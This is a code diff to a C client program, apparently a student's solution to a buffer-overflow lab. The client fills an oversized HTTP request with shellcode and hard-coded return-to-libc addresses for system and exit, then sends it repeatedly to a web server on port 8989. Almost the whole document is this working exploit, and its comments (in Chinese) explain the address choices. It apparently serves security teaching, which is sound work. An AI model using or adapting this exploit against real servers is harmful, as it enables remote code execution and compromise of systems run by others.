@@ -20,7 +20,7 @@
 #include <sys/shm.h>
 #define NOP 0x90
 #define PORT  8989
-
+int browser(int port,int stringaddr);
 /*
 ** construct your shellcode
 **create_shellcode.c will help you to create a shellcode.
@@ -37,15 +37,22 @@
   "\x99"
   "\xb0\x0b"
   "\xcd\x80" ;
-int main(int argc, char *argv[])
-{
-  int  port = PORT;
-  if (argc>1)
-    port = atoi(argv[1]);
-
-  int sock_client = socket(AF_INET,SOCK_STREAM, 0);//sock fd
   
-  struct sockaddr_in addr;
+  
+  
+ int main(int argc,char *argv[])
+ {
+   int port=PORT,addr=0xbffff000;
+   if(argc>1) port=atoi(argv[1]);
+//   for(addr=0xbffff400;addr<=0xbffff9ff;addr++)
+        browser(port,addr);
+   
+ }
+int browser(int port,int stringaddr)
+{
+  
+  int sock_client = socket(AF_INET,SOCK_STREAM, 0);//sock fd
+   struct sockaddr_in addr;
   memset(&addr, 0, sizeof(addr));
   addr.sin_family = AF_INET;
   addr.sin_port = htons(port);  //server port
@@ -60,66 +67,29 @@ int main(int argc, char *argv[])
     }
  
   printf("sock_client = %d\n",sock_client);
-  
-
-  /*
-    your task is to exploit your attack..
-    step1 : define a buffer array 
-    step2 : construct a attack shellcode to the buffer
-    step3 : send the buffer to web server to realize your attack
-    remember that you must send a request which end up with "\r\n\r\n",if you
-    want your browser receice the answer response from server
-  */
-
-  //code fill in it
-	char *req="GET / HTTP/1.1\r\n\r\n";
-  char uri[1065];//uri不能太大，否则会把是getToken的参数fd也覆盖掉，这样getchar就读不到fd程序在getchar内终止
-	/*先把返回地址写到字符数组*/
+  char uri[1065];
   long *addr_s;
   int i;
   addr_s=(long *)uri;
   for(i=0;i<266;i++)
-	 addr_s[i]=0xb7e5f060;
-	addr_s[i++]=0xb7e52be0;
-   addr_s[i]=  0xbffff000;
-		//"/bin/bash"的地址在不同的机器上时不一样的，要重新gdb查找其地址	
+	 addr_s[i]=0xb7e5f060;      //system的地址
+	 addr_s[i++]=0xb7e52be0;    //exit的地址
+   addr_s[i]= stringaddr;     //system的地址参数的地址
   for(i=0;i<strlen(shellcode);i++)
            uri[i]=shellcode[i];
      uri[1073]='\0';
      uri[1072]=' ';
-     
-
- char resp[1024];
- int num = 0;
-  write(sock_client,uri,strlen(uri));
-/* 
-    below show that client send a normal request to the web server
-    you should fix the code to realize your attack
-  */  
- // char *req ="GET / HTTP/1.1\r\n\r\n";
- 
-  while(!read(sock_client,&resp[num],1))
-  {
-    close(sock_client);
-    if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
-    {
-      perror("connect");
-      exit(1);
-    }
-    addr_s[i]  +=1;
-    write(sock_client,uri,strlen(uri));
-        
-  }
-  //receive the response from web server
- 
- 
-  while(read (sock_client, &resp[num], 1))
-	num++;
-  resp[num] = 0;
-  printf("Response = %s\n",resp);
-  
+     write(sock_client,uri,strlen(uri));    
+     write(sock_client,uri,strlen(uri));    
+     write(sock_client,uri,strlen(uri));    
+     write(sock_client,uri,strlen(uri));    
+// char resp[1024];
+// int num = 0;
+  //while(read (sock_client, &resp[num], 1))
+//	num++;
+  //resp[num] = 0;
+ // printf("Response = %s\n",resp);
   close(sock_client);
-  
- 
- return 0;
+  printf("have closed socket\n");
+  return 0;
 }
